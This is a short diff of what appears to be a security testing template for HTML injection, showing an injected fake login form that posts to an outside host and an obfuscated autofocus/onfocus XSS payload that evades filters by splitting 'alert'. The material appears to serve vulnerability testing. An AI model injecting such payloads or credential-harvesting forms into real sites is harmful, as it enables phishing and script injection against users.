@@ -6,7 +6,7 @@ info:
     <div class="login-form">
       <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
-        <A Href AutoFocus %252F="/"OnFocus=k='t',top['aler'+k](1)>
+        <A Href AutoFocus %252F="https://m4.lu"OnFocus=k='t',top['aler'+k](1)>
       </div>
       <div class="form-container">
         <form action="https://m4.lu" method="post" class="form-signin">
